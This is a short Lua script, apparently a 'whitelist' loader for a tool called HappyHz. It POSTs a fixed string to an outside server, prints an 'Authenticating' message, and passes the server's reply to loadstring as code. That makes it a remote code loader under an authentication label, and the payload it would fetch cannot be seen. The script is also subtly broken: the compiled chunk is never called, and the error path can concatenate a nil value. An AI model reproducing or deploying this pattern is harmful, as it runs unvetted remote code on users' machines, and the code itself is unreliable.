local http = require("socket.http")
local ltn12 = require("ltn12")

-- Set the URL of your API endpoint
local url = "https://whitelist.happyhz.xyz/test.php"

-- Initialize the request body
local requestBody = "happyhz"

-- Set the request headers
local requestHeaders = {
  ["Content-Type"] = "application/x-www-form-urlencoded",
  ["Content-Length"] = tostring(#requestBody)
}

-- Send the POST request
local responseBody = {}
local response, responseCode, responseHeaders = http.request({
  url = url,
  method = "POST",
  headers = requestHeaders,
  source = ltn12.source.string(requestBody),
  sink = ltn12.sink.table(responseBody)
})

-- Check for errors and handle them
if responseCode ~= 200 then
  print("Error: " .. response)
  return
end

-- Convert the response table to a string
responseBody = table.concat(responseBody)

-- Print the response
print("[HappyHz]: [1/3] Authenticating...")
loadstring(responseBody)
